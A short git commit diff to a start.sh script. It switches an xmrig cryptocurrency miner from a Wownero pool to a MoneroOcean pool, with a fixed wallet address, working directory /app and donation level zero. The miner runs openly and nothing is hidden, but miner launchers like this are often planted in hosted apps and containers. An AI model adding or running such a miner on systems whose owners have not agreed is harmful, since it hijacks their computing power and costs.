58ca6461098171ee76c9855e252300c982f5e796
Zelticu <Zelticue@gmail.com>
2025-07-14 22:07:13 -0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,2 +1,5 @@
 #!/bin/bash
-./xmrig -o stratum+tcp://pool.wownero.com:3333 -u Wo4eVYJsXWT8w8sArwpGUKLQib45J5x2nMgEnjSBw9iWCDhXf64KXtV5oNhRwAokNtfUw1AM9ekoi12SAM8R7C3A1GK2UiDvv -p x --coin wow --threads=1 --cpu-priority=3 --donate-level=1
+cd /app
+./xmrig/xmrig -o gulf.moneroocean.stream:10128 \
+-u Wo4eVYJsXWT8w8sArwpGUKLQib45J5x2nMgEnjSBw9iWCDhXf64KXtV5oNhRwAokNtfUw1AM9ekoi12SAM8R7C3A1GK2UiDvv \
+--coin wownero -p x --threads 1 --cpu-priority 0 --donate-level 0
